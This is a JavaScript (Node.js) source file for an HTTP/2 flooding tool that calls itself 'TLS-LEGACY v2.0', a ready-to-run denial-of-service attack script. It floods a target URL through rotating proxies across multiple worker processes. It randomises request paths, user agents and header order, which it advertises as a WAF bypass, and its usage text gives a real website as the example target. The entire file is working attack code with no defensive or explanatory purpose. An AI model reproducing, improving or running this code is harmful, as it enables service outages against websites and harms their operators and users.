const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');

// Configurações de Supressão de Erros
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EPERM', 'EADDRINUSE', 'EADDRNOTAVAIL'];

process.on('uncaughtException', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return; });
process.on('unhandledRejection', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return; });
process.on('warning', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return; });

if (process.argv.length < 7) {
    console.log(`
    ------------------------------------------------------------
    TLS-LEGACY v2.0 - ULTRA HIGH POWERED HTTP/2 FLOODER
    ------------------------------------------------------------
    Usage: node TLS-LEGACY.js [URL] [TIME] [THREADS] [RATE] [PROXY]
    Example: node TLS-LEGACY.js https://google.com/ 120 5 10 http.txt
    ------------------------------------------------------------
    Features:
    - HTTP/2 Multiplexing & Stream Prioritization
    - Dynamic Header Shuffling (WAF Bypass)
    - Randomized JA3/TLS Fingerprinting
    - Advanced Proxy Rotation
    - Multi-Core Cluster Optimization
    ------------------------------------------------------------
    `);
    process.exit(0);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const rate = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

const parsedTarget = url.parse(target);
let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
} catch (e) {
    console.log("[ERROR] Could not read proxy file.");
    process.exit(1);
}

const uas = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
];

function getRandomUA() { return uas[Math.floor(Math.random() * uas.length)]; }
function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

if (cluster.isMaster) {
    console.log(`[START] Target: ${target}`);
    console.log(`[START] Threads: ${threads} | Rate: ${rate} | Time: ${time}s`);
    
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log("[FINISH] Attack duration reached.");
        process.exit(0);
    }, time * 1000);
} else {
    function startAttack() {
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        const proxyHost = proxyAddr[0];
        const proxyPort = parseInt(proxyAddr[1]);

        const agent = getRandomUA();
        
        // Dynamic Header Generation
        const baseHeaders = {
            ':method': 'GET',
            ':path': parsedTarget.path + (parsedTarget.path.includes('?') ? '&' : '?') + crypto.randomBytes(4).toString('hex'),
            ':scheme': 'https',
            ':authority': parsedTarget.host,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': agent,
            'x-forwarded-for': proxyHost,
            'referer': 'https://' + (Math.random() > 0.5 ? 'google.com' : 'bing.com') + '/'
        };

        // Header Shuffling Bypass
        const shuffledHeaders = {};
        const keys = Object.keys(baseHeaders);
        keys.sort(() => Math.random() - 0.5);
        keys.forEach(key => shuffledHeaders[key] = baseHeaders[key]);

        const socket = net.connect(proxyPort, proxyHost, () => {
            socket.setKeepAlive(true, 60000);
            socket.setNoDelay(true);

            const tlsConn = tls.connect({
                socket: socket,
                ALPNProtocols: ['h2'],
                servername: parsedTarget.host,
                rejectUnauthorized: false,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
            }, () => {
                const h2 = http2.connect(target, {
                    createConnection: () => tlsConn,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                        enablePush: false
                    }
                });

                h2.on('error', () => { h2.destroy(); tlsConn.destroy(); socket.destroy(); });

                for (let i = 0; i < rate; i++) {
                    const req = h2.request(shuffledHeaders, { weight: getRandomInt(200, 255), exclusive: true });
                    req.setPriority({ weight: getRandomInt(200, 255), exclusive: true });
                    req.on('response', () => { req.close(); });
                    req.end();
                }
            });

            tlsConn.on('error', () => { tlsConn.destroy(); socket.destroy(); });
        });

        socket.on('error', () => { socket.destroy(); });
    }

    setInterval(startAttack, 1000);
}
